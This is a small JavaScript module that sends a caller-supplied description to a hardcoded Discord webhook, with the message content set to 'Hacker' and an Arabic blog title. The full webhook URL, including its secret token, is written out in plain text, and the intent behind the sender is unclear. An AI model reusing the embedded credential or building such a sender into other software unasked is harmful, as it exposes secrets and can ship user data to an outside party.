import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: "  2 مدونة زاجل ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1356904760237625424/xfKWBmRAVOIGJ7iwXJ0r49HfeKOFFXqyWpmTZVTzTtqM-KPEI3eOlHUPMJpB9RZ7Tz2f",body)
    }
  return {
    Send,
}
}

export default TeleSned;
